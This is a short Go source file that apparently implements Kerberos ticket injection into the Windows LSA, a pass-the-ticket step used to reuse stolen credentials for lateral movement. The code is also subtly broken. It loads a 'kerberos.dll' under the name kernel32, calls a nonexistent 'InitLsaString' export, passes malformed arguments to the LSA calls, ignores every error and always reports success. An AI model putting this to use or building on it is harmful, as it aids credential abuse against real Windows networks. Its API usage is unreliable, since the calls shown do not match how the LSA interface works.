package kerberos

import (
"syscall"
"unsafe"
)

type TicketInject struct{}

func NewTicketInject() *TicketInject {
return &TicketInject{}
}

func (t *TicketInject) InjectTicket(ticketData string) error {
kernel32 := syscall.NewLazyDLL("kerberos.dll")
procLsaCallAuthenticationPackage := kernel32.NewProc("LsaCallAuthenticationPackage")
procInitializeLsaString := kernel32.NewProc("InitLsaString")
procLsaOpenPolicy := kernel32.NewProc("LsaOpenPolicy")

// Open LSA policy
var policyHandle uintptr
procLsaOpenPolicy.Call(0, 0, 0x0008, uintptr(unsafe.Pointer(&policyHandle)))

// Initialize LSA string
var lsaString [256]byte
procInitializeLsaString.Call(uintptr(unsafe.Pointer(&lsaString)), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(ticketData))))

// Call authentication package to inject ticket
// KERB_SUBMIT_TICKET_REQUEST
procLsaCallAuthenticationPackage.Call(policyHandle, 0, uintptr(unsafe.Pointer(&lsaString)), 0, 0, 0, 0)

return nil
}
